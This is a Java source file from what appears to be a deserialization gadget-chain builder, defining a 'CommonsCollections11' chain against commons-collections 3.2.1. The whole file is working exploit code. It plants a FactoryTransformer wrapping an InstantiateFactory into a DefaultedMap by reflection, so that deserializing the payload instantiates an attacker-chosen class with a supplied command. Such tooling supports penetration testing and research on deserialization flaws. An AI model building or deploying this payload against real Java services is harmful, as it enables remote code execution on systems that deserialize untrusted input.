package org.ses.gadgetbuilder.chains1;

import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import org.apache.commons.collections.map.DefaultedMap;
import org.ses.gadgetbuilder.adapters.InitializeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.InstantiateGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.singleparam.MapGetTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

@Dependencies({"org.apache.commons:commons-collections:3.2.1"})
@Authors({ Authors.YihengZhang })
@Impact(Impact.Instantiate)
public class CommonsCollections11 extends InstantiateGadgetChain<MapGetTrampoline, InitializeAdapter> {

    public CommonsCollections11(MapGetTrampoline _trampoline, InitializeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        InstantiateFactory factory = new InstantiateFactory(
                initializeAdapter.getConstructorClass(),
                initializeAdapter.getParamTypes(),
                initializeAdapter.getParams(command));
        FactoryTransformer transformer = new FactoryTransformer(factory);

        DefaultedMap d = new DefaultedMap("1");
        Reflections.setFieldValue(d, "value", transformer);

        return new TrampolineConnector(d);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "org.apache.commons.collections.map.DefaultedMap.get\n" +
                "org.apache.commons.collections.functors.FactoryTransformer.transform\n" +
                "org.apache.commons.collections.functors.InstantiateFactory.create\n" +
                "java.lang.reflect.Constructor.newInstance";
    }
}
